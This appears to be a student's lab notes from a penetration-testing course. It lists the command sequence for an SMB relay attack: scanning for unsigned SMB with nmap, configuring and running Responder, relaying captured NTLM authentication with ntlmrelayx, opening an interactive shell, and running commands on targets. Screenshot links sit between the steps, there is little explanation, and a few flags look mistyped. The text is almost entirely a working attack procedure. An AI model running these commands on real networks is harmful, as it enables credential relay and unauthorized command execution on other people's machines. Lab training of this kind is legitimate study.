## SMB Relay Attacks

```bash
nmap --script=smb2-security-mode.nse -445 <target IP address> -Pn

```

<img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/smb-relay-2.png">

```bash
 sudo nano targets.txt 
```
<img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/smb-relay-3.png">

```bash
sudo mousepad /etc/responder/Responder.conf
```

<img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/smb-relay-4.png">



<img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/smb-relay-5.png">

```bash
sudo responder -I eth0 
```
<img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/smb-relay-6.png">

```bash
sudo python3 ntlmrelayx.py -smb2support -tf targets.txt 
```
<img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/smb-relay-7.png">

<img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/smb-relay-8.png">



<img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/smb-relay-9.png">

<img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/smb-relay-10.png">

```bash
sudo ntlmrelayx.py -tf targets.txt -smbsupport -i
```

<img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/smb-relay-11.png">

```bash
nc 127.0.0.1 11001
```

<img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/smb-relay-12.png">

```bash
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

<img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/smb-relay-13.png">






